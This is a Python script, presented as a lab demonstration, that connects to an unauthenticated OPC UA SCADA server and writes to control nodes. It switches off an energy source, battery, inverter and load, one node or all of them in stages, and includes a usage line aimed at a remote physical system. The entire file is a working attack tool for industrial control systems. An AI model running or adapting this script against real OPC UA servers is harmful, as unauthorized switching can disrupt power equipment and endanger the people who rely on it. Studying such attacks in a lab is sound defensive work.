#!/usr/bin/env python3
"""
opcua_direct_attack.py
----------------------
Lab demo: unauthorized direct OPC UA writes to a SCADA control server.

This script connects to the OPC UA server on port 4840 as an independent
client — completely bypassing the Flask dashboard and its login page.
It demonstrates that the OPC UA layer itself has no access control:
any reachable client can read and write control nodes freely.

The Flask dashboard will reflect every change in real time, making the
impact visible without the attacker ever touching the web interface.

Usage examples
--------------
  # Flip a single node off then restore it after 5 seconds:
  python opcua_direct_attack.py --node inv_sw --value off --restore-after 5

  # Flip all four switches off (staged attack), then restore:
  python opcua_direct_attack.py --all --value off --restore-after 8

  # Target a remote physical system:
  python opcua_direct_attack.py --url opc.tcp://192.168.1.50:4840/freeopcua/server/ --all --value off
"""

import argparse
import time
from opcua import Client

# OPC UA server defaults
DEFAULT_URL = "opc.tcp://127.0.0.1:4840/freeopcua/server/"
NS_URI      = "http://scada.control"

# Node registry
# Maps short name -> (parent object name, human label)
# Order matches the energy flow: source -> battery -> inverter -> load
SWITCH_NODES = {
    "source_sw": ("ENERGY SOURCE",  "Energy source switch"),
    "batt_sw":   ("BATTERY",        "Battery switch"),
    "inv_sw":    ("LOAD INVERTER",  "Inverter / AC load switch"),
    "load_sw":   ("LOAD",           "MPPT / DC load switch"),
}

TELEMETRY_NODES = {
    "source_val": "ENERGY SOURCE",
    "batt_val":   "BATTERY",
    "inv_val":    "LOAD INVERTER",
    "load_val":   "LOAD",
}


# Helpers

def q(nsidx, name):
    """Build a qualified browse-name string for get_child()."""
    return f"{nsidx}:{name}"


def resolve_nodes(client, nsidx):
    """
    Walk the OPC UA address space and return two dicts:
        switches   {short_name: node}
        telemetry  {short_name: node}
    """
    objects   = client.get_objects_node()
    dashboard = objects.get_child([q(nsidx, "Dashboard_Interface")])

    parent_objects = {
        "LOAD":          dashboard.get_child([q(nsidx, "LOAD")]),
        "ENERGY SOURCE": dashboard.get_child([q(nsidx, "ENERGY SOURCE")]),
        "BATTERY":       dashboard.get_child([q(nsidx, "BATTERY")]),
        "LOAD INVERTER": dashboard.get_child([q(nsidx, "LOAD INVERTER")]),
    }

    switches = {}
    for short_name, (parent_label, _) in SWITCH_NODES.items():
        switches[short_name] = parent_objects[parent_label].get_child([q(nsidx, short_name)])

    telemetry = {}
    for short_name, parent_label in TELEMETRY_NODES.items():
        telemetry[short_name] = parent_objects[parent_label].get_child([q(nsidx, short_name)])

    return switches, telemetry


def read_state(switches, telemetry):
    """Print a formatted snapshot of all control and telemetry nodes."""
    print(f"  {'Node':<12} {'Switch':<8}  Telemetry")
    print(f"  {'-'*12} {'-'*8}  {'-'*12}")
    pairs = [
        ("source_sw", "source_val"),
        ("batt_sw",   "batt_val"),
        ("inv_sw",    "inv_val"),
        ("load_sw",   "load_val"),
    ]
    for sw_name, val_name in pairs:
        sw_val  = switches[sw_name].get_value()
        tel_val = telemetry[val_name].get_value()
        state   = "ON " if sw_val else "OFF"
        print(f"  {sw_name:<12} {state:<8}  {tel_val}")


def write_node(node, value: bool, label: str):
    node.set_value(value)
    state = "ON" if value else "OFF"
    print(f"  [WRITE] {label:<30} -> {state}")


# Main

def main():
    parser = argparse.ArgumentParser(
        description="Lab demo: unauthorized direct OPC UA writes, bypassing the Flask dashboard."
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help=f"OPC UA server endpoint (default: {DEFAULT_URL})"
    )
    parser.add_argument(
        "--node",
        choices=SWITCH_NODES.keys(),
        help="Single control node to write. Ignored if --all is set."
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Write to all four switch nodes (staged, 0.5 s apart)."
    )
    parser.add_argument(
        "--value",
        choices=["on", "off"],
        default="off",
        help="Value to write: on or off (default: off)"
    )
    parser.add_argument(
        "--restore-after",
        type=float,
        default=0,
        metavar="SECONDS",
        help="Restore original values after N seconds (0 = no restore)."
    )
    parser.add_argument(
        "--stage-delay",
        type=float,
        default=0.5,
        metavar="SECONDS",
        help="Delay between each node write when using --all (default: 0.5 s)."
    )
    args = parser.parse_args()

    if not args.node and not args.all:
        parser.error("Specify --node <name> or --all.")

    target_value = (args.value == "on")

    # Connect
    print(f"\n[*] Connecting directly to OPC UA server (bypassing Flask dashboard)")
    print(f"    Endpoint : {args.url}")

    client = Client(args.url)
    try:
        client.connect()
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return

    print(f"[+] Connected. No authentication was required.\n")

    try:
        nsidx = client.get_namespace_index(NS_URI)
        switches, telemetry = resolve_nodes(client, nsidx)

        # Snapshot before
        print("[*] System state BEFORE attack:")
        read_state(switches, telemetry)

        # Save originals for restore
        originals = {name: node.get_value() for name, node in switches.items()}

        # Write
        targets = list(SWITCH_NODES.keys()) if args.all else [args.node]

        print(f"\n[*] Writing {'all nodes' if args.all else args.node} -> {args.value.upper()}")
        for name in targets:
            _, label = SWITCH_NODES[name]
            write_node(switches[name], target_value, label)
            if args.all and args.stage_delay > 0:
                time.sleep(args.stage_delay)

        # Give the server's telemetry loop one cycle to update
        time.sleep(0.6)

        # Snapshot after
        print("\n[*] System state AFTER attack:")
        read_state(switches, telemetry)

        # Restore
        if args.restore_after > 0:
            print(f"\n[*] Restoring in {args.restore_after}s  (dashboard will show recovery) ...")
            time.sleep(args.restore_after)

            print("\n[*] Restoring original values:")
            for name in targets:
                _, label = SWITCH_NODES[name]
                write_node(switches[name], originals[name], label)
                if args.all and args.stage_delay > 0:
                    time.sleep(args.stage_delay)

            time.sleep(0.6)
            print("\n[*] System state AFTER restore:")
            read_state(switches, telemetry)

    finally:
        client.disconnect()
        print("\n[*] Disconnected.")


if __name__ == "__main__":
    main()
